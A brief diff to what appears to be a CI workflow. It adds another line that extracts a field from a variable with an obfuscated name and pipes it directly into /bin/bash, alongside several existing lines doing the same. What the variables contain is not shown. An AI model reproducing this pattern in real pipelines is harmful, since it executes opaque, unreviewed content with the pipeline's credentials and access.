@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$y49" | jq -r .s73 | /bin/bash
           printf '%s' "$r816" | jq -r .a8 | /bin/bash
           printf '%s' "$crc29" | jq -r .jqq60770 | /bin/bash
+          printf '%s' "$ctalp40" | jq -r .pc9 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
